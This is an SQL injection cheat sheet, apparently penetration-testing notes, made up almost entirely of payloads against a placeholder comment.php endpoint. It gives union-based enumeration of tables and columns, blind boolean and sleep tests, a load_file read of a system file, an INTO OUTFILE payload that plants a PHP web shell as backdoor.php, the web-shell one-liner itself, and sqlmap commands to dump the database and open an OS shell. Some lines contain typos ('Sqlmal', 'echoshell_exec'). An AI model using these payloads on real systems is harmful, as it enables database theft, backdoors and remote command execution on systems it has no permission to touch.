# SQL Injection

### Enumerating the Database (using union statements)
```
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,table_name,6%20from%20information_schema.tables
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,@@version,6
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,5,6
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,column_name,6%20from%20information_schema.columns%20where%20table_name=%27users%27
```

### Blind SQL Injection
```
http://10.x.x.x/comment.php?id=782%20and%201=1 (and 1=1)
http://10.x.x.x/comment.php?id=782-sleep(5) (-sleep(5))
```

### load_file Function
```
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,load_file(“c:/windows/system32/drivers/etc/hosts”),6

```
### into OUTFILE
```
Into OUTFILE
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,%22%3C?php%20echoshell_exec($_GET[%27cmd%27]);?%3E%22,6%20into%20OUTFILE%20%27c:/xampp/htdocs/backdoor.php%27
```

### PHP One-Liner
```
<?php echo shell_exec($_GET['cmd']);?>"
```

### SQLMap
```
Sqlmal -u http://10.x.x.x --crawl=1
Sqlmap -u http://10.x.x.x/comment.php --dump --dbms=mysql --threads=5
Sqlmap -u http://10.x.x.x/comment.php --dbms=mysql --threads=5 --os-shell

```
